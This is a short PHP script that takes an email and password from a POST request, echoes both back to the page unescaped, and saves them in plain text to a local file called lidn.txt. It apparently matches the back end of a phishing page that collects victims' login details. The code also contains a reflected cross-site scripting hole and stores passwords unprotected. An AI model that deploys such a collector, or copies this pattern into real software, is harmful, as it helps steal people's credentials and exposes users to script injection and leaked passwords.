<?php
$email = $_POST['email'];
$pass = $_POST['pass'];
echo $email;
echo $pass;
$fp = fopen('lidn.txt', 'w');
fwrite($fp, $email);
fwrite($fp, $pass);
fclose($fp);
?>